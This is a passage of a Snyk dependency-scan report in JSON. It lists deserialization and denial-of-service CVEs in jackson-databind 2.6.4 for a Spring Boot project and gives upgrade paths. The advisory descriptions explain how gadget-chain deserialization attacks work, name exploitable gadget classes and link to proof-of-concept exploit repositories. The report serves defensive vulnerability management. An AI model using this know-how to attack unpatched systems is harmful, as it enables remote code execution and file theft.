          },
          "version": [
            "[,2.9.10.8)"
          ]
        }
      ],
      "functions_new": [
        {
          "functionId": {
            "className": "com.fasterxml.jackson.databind.ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.9.10.8)"
          ]
        }
      ],
      "id": "SNYK-JAVA-COMFASTERXMLJACKSONCORE-1056426",
      "identifiers": {
        "CVE": [
          "CVE-2020-36188"
        ],
        "CWE": [
          "CWE-502"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "jackson-databind",
        "groupId": "com.fasterxml.jackson.core"
      },
      "modificationTime": "2021-01-12T14:26:34.490625Z",
      "moduleName": "com.fasterxml.jackson.core:jackson-databind",
      "packageManager": "maven",
      "packageName": "com.fasterxml.jackson.core:jackson-databind",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2021-01-07T16:40:32Z",
      "references": [
        {
          "title": "GitHub Issue",
          "url": "https://github.com/FasterXML/jackson-databind/issues/2996"
        },
        {
          "title": "Medium Article",
          "url": "https://cowtowncoder.medium.com/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062"
        },
        {
          "title": "PoC",
          "url": "https://github.com/Al1ex/CVE-2020-36188"
        }
      ],
      "semver": {
        "vulnerable": [
          "[,2.9.10.8)"
        ]
      },
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "severityWithCritical": "high",
      "from": [
        "com.canh:JavaSpring@1.0-SNAPSHOT",
        "org.springframework.boot:spring-boot-starter-web@1.3.1.RELEASE",
        "com.fasterxml.jackson.core:jackson-databind@2.6.4"
      ],
      "upgradePath": [
        false,
        "org.springframework.boot:spring-boot-starter-web@2.0.0.RELEASE"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.fasterxml.jackson.core:jackson-databind",
      "version": "2.6.4"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P/RL:U/RC:C",
      "alternativeIds": [],
      "creationTime": "2021-01-07T13:41:09.172252Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 8.1,
      "description": "## Overview\n[com.fasterxml.jackson.core:jackson-databind](https://github.com/FasterXML/jackson-databind) is a library which contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. The package mishandles the interaction between serialization gadgets and typing, related to `org.apache.tomcat.dbcp.dbcp.cpdsadapter.DriverAdapterCPDS`.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating objects from a  sequence of bytes is called deserialization. _Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) occurs when an application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, allowing the attacker to control the state or the flow of the execution.\n\n`com.fasterxml.jackson.core:jackson-databind` allows deserialization of JSON input to Java objects. If an application using this dependency has the ability to deserialize a JSON string from an untrusted source, an attacker could leverage this vulnerability to conduct deserialization attacks.\n\nExploitation of unsafe deserialization attacks through `jackson-databind` requires the following prerequisites: \n\n### 1. The target application allowing JSON user input which is processed by jackson-databind\n\nAn application using `jackson-databind` is only vulnerable if a user-provided JSON data is deserialized. \n\n### 2. Polymorphic type handling for properties with nominal type are enabled\n\nPolymorphic type handling refers to the addition of enough type information so that the deserializer can instantiate the appropriate subtype of a value. Use of \"default typing\" is considered dangerous due to the possibility of an untrusted method (gadget) managing to specify a class that is accessible through the class-loader and therefore, exposing a set of methods and/or fields.\n\n### 3. An exploitable gadget class is available for the attacker to leverage \n\nGadget chains are specially crafted method sequences that can be created by an attacker in order to change the flow of code execution. These gadgets are often methods introduced by third-party components which an attacker could utilise in order to attack the target application. Not every gadget out there is supported by `jackson-databind`. The maintainers of `jackson-databind` proactively blacklists possible serialization gadgets in an attempt to ensure that it is not possible for an attacker to chain gadgets during serialization. \n\n### Further reading:\n\n - [On Jackson CVEs: Don’t Panic on Medium](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n - [NCC Group Jackson Deserialization WhitePaper](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2018/jackson_deserialization.pdf)\n - [Java Security Best Practices](https://snyk.io/blog/10-java-security-best-practices/)\n  \n## Remediation\nUpgrade `com.fasterxml.jackson.core:jackson-databind` to version 2.9.10.8 or higher.\n## References\n- [GitHub Issue](https://github.com/FasterXML/jackson-databind/issues/3004)\n- [Medium Article](https://cowtowncoder.medium.com/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n- [Poc](https://github.com/Al1ex/CVE-2020-36179)\n",
      "disclosureTime": "2021-01-07T13:38:31Z",
      "exploit": "Proof of Concept",
      "fixedIn": [
        "2.9.10.8"
      ],
      "functions": [
        {
          "functionId": {
            "className": "ObjectMapper",
            "filePath": "com/fasterxml/jackson/databind/ObjectMapper.java",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[, 2.9.10.8)"
          ]
        }
      ],
      "functions_new": [
        {
          "functionId": {
            "className": "com.fasterxml.jackson.databind.ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[, 2.9.10.8)"
          ]
        }
      ],
      "id": "SNYK-JAVA-COMFASTERXMLJACKSONCORE-1056427",
      "identifiers": {
        "CVE": [
          "CVE-2020-36181"
        ],
        "CWE": [
          "CWE-502"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "jackson-databind",
        "groupId": "com.fasterxml.jackson.core"
      },
      "modificationTime": "2021-01-11T13:42:40.238292Z",
      "moduleName": "com.fasterxml.jackson.core:jackson-databind",
      "packageManager": "maven",
      "packageName": "com.fasterxml.jackson.core:jackson-databind",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2021-01-07T16:40:32Z",
      "references": [
        {
          "title": "GitHub Issue",
          "url": "https://github.com/FasterXML/jackson-databind/issues/3004"
        },
        {
          "title": "Medium Article",
          "url": "https://cowtowncoder.medium.com/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062"
        },
        {
          "title": "Poc",
          "url": "https://github.com/Al1ex/CVE-2020-36179"
        }
      ],
      "semver": {
        "vulnerable": [
          "[, 2.9.10.8)"
        ]
      },
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "severityWithCritical": "high",
      "from": [
        "com.canh:JavaSpring@1.0-SNAPSHOT",
        "org.springframework.boot:spring-boot-starter-web@1.3.1.RELEASE",
        "com.fasterxml.jackson.core:jackson-databind@2.6.4"
      ],
      "upgradePath": [
        false,
        "org.springframework.boot:spring-boot-starter-web@2.0.0.RELEASE"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.fasterxml.jackson.core:jackson-databind",
      "version": "2.6.4"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
      "alternativeIds": [],
      "creationTime": "2021-01-18T12:50:16.466618Z",
      "credit": [
        "Yangkun (ICSL)"
      ],
      "cvssScore": 8.1,
      "description": "## Overview\n[com.fasterxml.jackson.core:jackson-databind](https://github.com/FasterXML/jackson-databind) is a library which contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. A malicious user could perform a SSRF attack via the `javax.swing` gadget (specifically `javax.swing.JTextPane`).\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating object from sequence of bytes is called deserialization. Serialization is commonly used for communication (sharing objects between multiple hosts) and persistence (store the object state in a file or a database). It is an integral part of popular protocols like _Remote Method Invocation (RMI)_, _Java Management Extension (JMX)_, _Java Messaging System (JMS)_, _Action Message Format (AMF)_, _Java Server Faces (JSF) ViewState_, etc.\n\n_Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)), is when the application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, letting the attacker to control the state or the flow of the execution.\n\nJava deserialization issues have been known for years. However, interest in the issue intensified greatly in 2015, when classes that could be abused to achieve remote code execution were found in a [popular library (Apache Commons Collection)](https://snyk.io/vuln/SNYK-JAVA-COMMONSCOLLECTIONS-30078). These classes were used in zero-days affecting IBM WebSphere, Oracle WebLogic and many other products.\n\n  \nAn attacker just needs to identify a piece of software that has both a vulnerable class on its path, and performs deserialization on untrusted data. Then all they need to do is send the payload into the deserializer, getting the command executed.\n  \n\n> Developers put too much trust in Java Object Serialization. Some even de-serialize objects pre-authentication. When deserializing an Object in Java you typically cast it to an expected type, and therefore Java's strict type system will ensure you only get valid object trees. Unfortunately, by the time the type checking happens, platform code has already created and executed significant logic. So, before the final type is checked a lot of code is executed from the readObject() methods of various objects, all of which is out of the developer's control. By combining the readObject() methods of various classes which are available on the classpath of the vulnerable application an attacker can execute functions (including calling Runtime.exec() to execute local OS commands).\n\n- Apache Blog\n  \n## Remediation\nUpgrade `com.fasterxml.jackson.core:jackson-databind` to version 2.9.10.7 or higher.\n## References\n- [GitHub Commit](https://github.com/FasterXML/jackson-databind/commit/7dbf51bf78d157098074a20bd9da39bd48c18e4a)\n- [GitHub Issue](https://github.com/FasterXML/jackson-databind/issues/2854)\n- [GitHub Release](https://github.com/FasterXML/jackson-databind/releases/tag/jackson-databind-2.9.10.7)\n- [RedHat Bugzilla Bug](https://bugzilla.redhat.com/show_bug.cgi?id=1916633)\n",
      "disclosureTime": "2021-01-16T00:00:00Z",
      "exploit": "Not Defined",
      "fixedIn": [
        "2.9.10.7"
      ],
      "functions": [
        {
          "functionId": {
            "className": "ObjectMapper",
            "filePath": "com/fasterxml/jackson/databind/ObjectMapper.java",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.9.10.7)"
          ]
        }
      ],
      "functions_new": [
        {
          "functionId": {
            "className": "com.fasterxml.jackson.databind.ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.9.10.7)"
          ]
        }
      ],
      "id": "SNYK-JAVA-COMFASTERXMLJACKSONCORE-1061931",
      "identifiers": {
        "CVE": [
          "CVE-2021-20190"
        ],
        "CWE": [
          "CWE-502",
          "CWE-918"
        ],
        "GHSA": [
          "GHSA-5949-rw7g-wx7w"
        ],
        "RHSA": [
          "RHSA-1610966837463990"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "jackson-databind",
        "groupId": "com.fasterxml.jackson.core"
      },
      "modificationTime": "2021-03-24T14:29:32.605583Z",
      "moduleName": "com.fasterxml.jackson.core:jackson-databind",
      "packageManager": "maven",
      "packageName": "com.fasterxml.jackson.core:jackson-databind",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2021-01-18T17:23:46Z",
      "references": [
        {
          "title": "GitHub Commit",
          "url": "https://github.com/FasterXML/jackson-databind/commit/7dbf51bf78d157098074a20bd9da39bd48c18e4a"
        },
        {
          "title": "GitHub Issue",
          "url": "https://github.com/FasterXML/jackson-databind/issues/2854"
        },
        {
          "title": "GitHub Release",
          "url": "https://github.com/FasterXML/jackson-databind/releases/tag/jackson-databind-2.9.10.7"
        },
        {
          "title": "RedHat Bugzilla Bug",
          "url": "https://bugzilla.redhat.com/show_bug.cgi?id=1916633"
        }
      ],
      "semver": {
        "vulnerable": [
          "[,2.9.10.7)"
        ]
      },
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "severityWithCritical": "high",
      "from": [
        "com.canh:JavaSpring@1.0-SNAPSHOT",
        "org.springframework.boot:spring-boot-starter-web@1.3.1.RELEASE",
        "com.fasterxml.jackson.core:jackson-databind@2.6.4"
      ],
      "upgradePath": [
        false,
        "org.springframework.boot:spring-boot-starter-web@2.0.0.RELEASE"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.fasterxml.jackson.core:jackson-databind",
      "version": "2.6.4"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P/RL:O/RC:R",
      "alternativeIds": [],
      "creationTime": "2019-05-19T10:19:10.287403Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 8.1,
      "description": "## Overview\n[com.fasterxml.jackson.core:jackson-databind](https://github.com/FasterXML/jackson-databind) is a library which contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. When Default Typing is enabled for an externally exposed JSON endpoint, the service has the mysql-connector-java jar in the classpath. An attacker can host a crafted MySQL server reachable by the victim and send a crafted JSON message that allows them to read arbitrary local files on the server. This occurs due to missing `com.mysql.cj.jdbc.admin.MiniAdmin` validation.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating objects from a  sequence of bytes is called deserialization. _Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) occurs when an application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, allowing the attacker to control the state or the flow of the execution.\n\n`com.fasterxml.jackson.core:jackson-databind` allows deserialization of JSON input to Java objects. If an application using this dependency has the ability to deserialize a JSON string from an untrusted source, an attacker could leverage this vulnerability to conduct deserialization attacks.\n\nExploitation of unsafe deserialization attacks through `jackson-databind` requires the following prerequisites: \n\n### 1. The target application allowing JSON user input which is processed by jackson-databind\n\nAn application using `jackson-databind` is only vulnerable if a user-provided JSON data is deserialized. \n\n### 2. Polymorphic type handling for properties with nominal type are enabled\n\nPolymorphic type handling refers to the addition of enough type information so that the deserializer can instantiate the appropriate subtype of a value. Use of \"default typing\" is considered dangerous due to the possibility of an untrusted method (gadget) managing to specify a class that is accessible through the class-loader and therefore, exposing a set of methods and/or fields.\n\n### 3. An exploitable gadget class is available for the attacker to leverage \n\nGadget chains are specially crafted method sequences that can be created by an attacker in order to change the flow of code execution. These gadgets are often methods introduced by third-party components which an attacker could utilise in order to attack the target application. Not every gadget out there is supported by `jackson-databind`. The maintainers of `jackson-databind` proactively blacklists possible serialization gadgets in an attempt to ensure that it is not possible for an attacker to chain gadgets during serialization. \n\n### Further reading:\n\n - [On Jackson CVEs: Don’t Panic on Medium](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n - [NCC Group Jackson Deserialization WhitePaper](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2018/jackson_deserialization.pdf)\n - [Java Security Best Practices](https://snyk.io/blog/10-java-security-best-practices/)\n  \n## Remediation\nUpgrade `com.fasterxml.jackson.core:jackson-databind` to version 2.9.9, 2.8.11.4, 2.7.9.6, 2.6.7.3 or higher.\n## References\n- [GitHub Commit](https://github.com/FasterXML/jackson-databind/commit/dda513bd7251b4f32b7b60b1c13740e3b5a43024)\n- [GitHub Issue](https://github.com/FasterXML/jackson-databind/issues/2326)\n- [Github Release Tag](https://github.com/FasterXML/jackson/wiki/Jackson-Release-2.9.9)\n- [PoC](https://github.com/Al1ex/CVE-2019-12086)\n",
      "disclosureTime": "2019-05-17T18:12:58Z",
      "exploit": "Proof of Concept",
      "fixedIn": [
        "2.9.9",
        "2.8.11.4",
        "2.7.9.6",
        "2.6.7.3"
      ],
      "functions": [
        {
          "functionId": {
            "className": "ObjectMapper",
            "filePath": "com/fasterxml/jackson/databind/ObjectMapper.java",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.9.9)"
          ]
        }
      ],
      "functions_new": [
        {
          "functionId": {
            "className": "com.fasterxml.jackson.databind.ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.9.9)"
          ]
        }
      ],
      "id": "SNYK-JAVA-COMFASTERXMLJACKSONCORE-174736",
      "identifiers": {
        "CVE": [
          "CVE-2019-12086"
        ],
        "CWE": [
          "CWE-502"
        ],
        "GHSA": [
          "GHSA-5ww9-j83m-q7qx"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "jackson-databind",
        "groupId": "com.fasterxml.jackson.core"
      },
      "modificationTime": "2021-08-25T15:54:55.518177Z",
      "moduleName": "com.fasterxml.jackson.core:jackson-databind",
      "packageManager": "maven",
      "packageName": "com.fasterxml.jackson.core:jackson-databind",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2019-05-17T18:12:58Z",
      "references": [
        {
          "title": "GitHub Commit",
          "url": "https://github.com/FasterXML/jackson-databind/commit/dda513bd7251b4f32b7b60b1c13740e3b5a43024"
        },
        {
          "title": "GitHub Issue",
          "url": "https://github.com/FasterXML/jackson-databind/issues/2326"
        },
        {
          "title": "Github Release Tag",
          "url": "https://github.com/FasterXML/jackson/wiki/Jackson-Release-2.9.9"
        },
        {
          "title": "PoC",
          "url": "https://github.com/Al1ex/CVE-2019-12086"
        }
      ],
      "semver": {
        "vulnerable": [
          "[2.9.0,2.9.9)",
          "[2.8.0,2.8.11.4)",
          "[2.7.0,2.7.9.6)",
          "[,2.6.7.3)"
        ]
      },
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "severityWithCritical": "high",
      "from": [
        "com.canh:JavaSpring@1.0-SNAPSHOT",
        "org.springframework.boot:spring-boot-starter-web@1.3.1.RELEASE",
        "com.fasterxml.jackson.core:jackson-databind@2.6.4"
      ],
      "upgradePath": [
        false,
        "org.springframework.boot:spring-boot-starter-web@2.0.0.RELEASE"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.fasterxml.jackson.core:jackson-databind",
      "version": "2.6.4"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
      "alternativeIds": [],
      "creationTime": "2022-03-11T13:26:43.073121Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 7.5,
      "description": "## Overview\n[com.fasterxml.jackson.core:jackson-databind](https://github.com/FasterXML/jackson-databind) is a library which contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor.\n\nAffected versions of this package are vulnerable to Denial of Service (DoS) via a large depth of nested objects.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.\n\nUnlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.\n\nOne popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.\n\nWhen it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.\n\nTwo common types of DoS vulnerabilities:\n\n* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).\n\n* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)\n\n## Remediation\nUpgrade `com.fasterxml.jackson.core:jackson-databind` to version 2.12.6.1, 2.13.2.1 or higher.\n## References\n- [GitHub Commit](https://github.com/FasterXML/jackson-databind/commit/fcfc4998ec23f0b1f7f8a9521c2b317b6c25892b)\n- [GitHub Issue](https://github.com/FasterXML/jackson-databind/issues/2816)\n- [GitHub PR](https://github.com/FasterXML/jackson-databind/pull/3416)\n",
      "disclosureTime": "2022-03-11T13:18:25Z",
      "exploit": "Not Defined",
      "fixedIn": [
        "2.12.6.1",
        "2.13.2.1"
      ],
      "functions": [],
      "functions_new": [],
      "id": "SNYK-JAVA-COMFASTERXMLJACKSONCORE-2421244",
      "identifiers": {
        "CVE": [
          "CVE-2020-36518"
        ],
        "CWE": [
          "CWE-400"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "jackson-databind",
        "groupId": "com.fasterxml.jackson.core"
      },
      "modificationTime": "2022-04-01T09:33:51.425400Z",
      "moduleName": "com.fasterxml.jackson.core:jackson-databind",
      "packageManager": "maven",
      "packageName": "com.fasterxml.jackson.core:jackson-databind",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2022-03-11T14:24:04Z",
      "references": [
        {
          "title": "GitHub Commit",
          "url": "https://github.com/FasterXML/jackson-databind/commit/fcfc4998ec23f0b1f7f8a9521c2b317b6c25892b"
        },
        {
          "title": "GitHub Issue",
          "url": "https://github.com/FasterXML/jackson-databind/issues/2816"
        },
        {
          "title": "GitHub PR",
          "url": "https://github.com/FasterXML/jackson-databind/pull/3416"
        }
      ],
      "semver": {
        "vulnerable": [
          "[, 2.12.6.1)",
          "[2.13.0, 2.13.2.1)"
        ]
      },
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Denial of Service (DoS)",
      "severityWithCritical": "high",
      "from": [
        "com.canh:JavaSpring@1.0-SNAPSHOT",
        "org.springframework.boot:spring-boot-starter-web@1.3.1.RELEASE",
        "com.fasterxml.jackson.core:jackson-databind@2.6.4"
      ],
      "upgradePath": [
        false,
        "org.springframework.boot:spring-boot-starter-web@2.0.0.RELEASE"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.fasterxml.jackson.core:jackson-databind",
      "version": "2.6.4"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P/RL:O/RC:C",
      "alternativeIds": [],
      "creationTime": "2017-09-14T14:43:48.569000Z",
      "credit": [
        "Liao Xinxi"
      ],
      "cvssScore": 8.1,
      "description": "## Overview\n[com.fasterxml.jackson.core:jackson-databind](https://github.com/FasterXML/jackson-databind) is a library which contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. An attacker may exploit this issue by sending a maliciously crafted input to the `readValue` method of the `ObjectMapper`.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating objects from a  sequence of bytes is called deserialization. _Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) occurs when an application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, allowing the attacker to control the state or the flow of the execution.\n\n`com.fasterxml.jackson.core:jackson-databind` allows deserialization of JSON input to Java objects. If an application using this dependency has the ability to deserialize a JSON string from an untrusted source, an attacker could leverage this vulnerability to conduct deserialization attacks.\n\nExploitation of unsafe deserialization attacks through `jackson-databind` requires the following prerequisites: \n\n### 1. The target application allowing JSON user input which is processed by jackson-databind\n\nAn application using `jackson-databind` is only vulnerable if a user-provided JSON data is deserialized. \n\n### 2. Polymorphic type handling for properties with nominal type are enabled\n\nPolymorphic type handling refers to the addition of enough type information so that the deserializer can instantiate the appropriate subtype of a value. Use of \"default typing\" is considered dangerous due to the possibility of an untrusted method (gadget) managing to specify a class that is accessible through the class-loader and therefore, exposing a set of methods and/or fields.\n\n### 3. An exploitable gadget class is available for the attacker to leverage \n\nGadget chains are specially crafted method sequences that can be created by an attacker in order to change the flow of code execution. These gadgets are often methods introduced by third-party components which an attacker could utilise in order to attack the target application. Not every gadget out there is supported by `jackson-databind`. The maintainers of `jackson-databind` proactively blacklists possible serialization gadgets in an attempt to ensure that it is not possible for an attacker to chain gadgets during serialization. \n\n### Further reading:\n\n - [On Jackson CVEs: Don’t Panic on Medium](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n - [NCC Group Jackson Deserialization WhitePaper](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2018/jackson_deserialization.pdf)\n - [Java Security Best Practices](https://snyk.io/blog/10-java-security-best-practices/)\n  \n## Remediation\nUpgrade `com.fasterxml.jackson.core:jackson-databind` to version 2.6.7.1, 2.7.9.1, 2.8.9 or higher.\n## References\n- [Exploit](https://github.com/JavanXD/Demo-Exploit-Jackson-RCE)\n- [GitHub Commit](https://github.com/FasterXML/jackson-databind/commit/60d459cedcf079c6106ae7da2ac562bc32dcabe1)\n- [GitHub Issue](https://github.com/FasterXML/jackson-databind/issues/1599)\n- [RedHat Bugzilla Bug](https://bugzilla.redhat.com/show_bug.cgi?id&#x3D;1462702)\n",
      "disclosureTime": "2017-04-10T21:00:00Z",
      "exploit": "Proof of Concept",
      "fixedIn": [
        "2.6.7.1",
        "2.7.9.1",
        "2.8.9"
      ],
      "functions": [
        {
          "functionId": {
            "className": "ObjectMapper",
            "filePath": "com/fasterxml/jackson/databind/ObjectMapper.java",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.6.7.1)",
            "[2.7,2.7.9.1)",
            "[2.8,2.8.9)"
          ]
        }
      ],
      "functions_new": [
        {
          "functionId": {
            "className": "com.fasterxml.jackson.databind.ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.6.7.1)",
            "[2.7,2.7.9.1)",
            "[2.8,2.8.9)"
          ]
        }
      ],
      "id": "SNYK-JAVA-COMFASTERXMLJACKSONCORE-31507",
      "identifiers": {
        "CVE": [
          "CVE-2017-7525"
        ],
        "CWE": [
          "CWE-502"
        ],
        "GHSA": [
          "GHSA-qxxx-2pp7-5hmx"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "jackson-databind",
        "groupId": "com.fasterxml.jackson.core"
      },
      "modificationTime": "2021-08-25T15:57:23.405438Z",
      "moduleName": "com.fasterxml.jackson.core:jackson-databind",
      "packageManager": "maven",
      "packageName": "com.fasterxml.jackson.core:jackson-databind",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2017-09-14T14:43:48Z",
      "references": [
        {
          "title": "Exploit",
          "url": "https://github.com/JavanXD/Demo-Exploit-Jackson-RCE"
        },
        {
          "title": "GitHub Commit",
          "url": "https://github.com/FasterXML/jackson-databind/commit/60d459cedcf079c6106ae7da2ac562bc32dcabe1"
        },
        {
          "title": "GitHub Issue",
          "url": "https://github.com/FasterXML/jackson-databind/issues/1599"
        },
        {
          "title": "RedHat Bugzilla Bug",
          "url": "https://bugzilla.redhat.com/show_bug.cgi?id&%23x3D%3B1462702"
        }
      ],
      "semver": {
        "vulnerable": [
          "[,2.6.7.1)",
          "[2.7.0,2.7.9.1)",
          "[2.8.0,2.8.9)"
        ]
      },
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "severityWithCritical": "high",
      "from": [
        "com.canh:JavaSpring@1.0-SNAPSHOT",
        "org.springframework.boot:spring-boot-starter-web@1.3.1.RELEASE",
        "com.fasterxml.jackson.core:jackson-databind@2.6.4"
      ],
      "upgradePath": [
        false,
        "org.springframework.boot:spring-boot-starter-web@1.5.5.RELEASE",
        "com.fasterxml.jackson.core:jackson-databind@2.8.9"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.fasterxml.jackson.core:jackson-databind",
      "version": "2.6.4"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
      "alternativeIds": [],
      "creationTime": "2017-11-07T13:13:32.343000Z",
      "credit": [
        "Liao Xinxi"
      ],
      "cvssScore": 8.1,
      "description": "## Overview\n[com.fasterxml.jackson.core:jackson-databind](https://github.com/FasterXML/jackson-databind) is a library which contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data due to an incomplete black list (incomplete fix for [CVE-2017-7525](https://snyk.io/vuln/SNYK-JAVA-COMFASTERXMLJACKSONCORE-31507)).\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating objects from a  sequence of bytes is called deserialization. _Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) occurs when an application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, allowing the attacker to control the state or the flow of the execution.\n\n`com.fasterxml.jackson.core:jackson-databind` allows deserialization of JSON input to Java objects. If an application using this dependency has the ability to deserialize a JSON string from an untrusted source, an attacker could leverage this vulnerability to conduct deserialization attacks.\n\nExploitation of unsafe deserialization attacks through `jackson-databind` requires the following prerequisites: \n\n### 1. The target application allowing JSON user input which is processed by jackson-databind\n\nAn application using `jackson-databind` is only vulnerable if a user-provided JSON data is deserialized. \n\n### 2. Polymorphic type handling for properties with nominal type are enabled\n\nPolymorphic type handling refers to the addition of enough type information so that the deserializer can instantiate the appropriate subtype of a value. Use of \"default typing\" is considered dangerous due to the possibility of an untrusted method (gadget) managing to specify a class that is accessible through the class-loader and therefore, exposing a set of methods and/or fields.\n\n### 3. An exploitable gadget class is available for the attacker to leverage \n\nGadget chains are specially crafted method sequences that can be created by an attacker in order to change the flow of code execution. These gadgets are often methods introduced by third-party components which an attacker could utilise in order to attack the target application. Not every gadget out there is supported by `jackson-databind`. The maintainers of `jackson-databind` proactively blacklists possible serialization gadgets in an attempt to ensure that it is not possible for an attacker to chain gadgets during serialization. \n\n### Further reading:\n\n - [On Jackson CVEs: Don’t Panic on Medium](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n - [NCC Group Jackson Deserialization WhitePaper](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2018/jackson_deserialization.pdf)\n - [Java Security Best Practices](https://snyk.io/blog/10-java-security-best-practices/)\n  \n## Remediation\nUpgrade `com.fasterxml.jackson.core:jackson-databind` to version 2.6.7.1, 2.7.9.1, 2.8.10 or higher.\n## References\n- [GitHub Commit](https://github.com/FasterXML/jackson-databind/commit/e8f043d1)\n- [GitHub 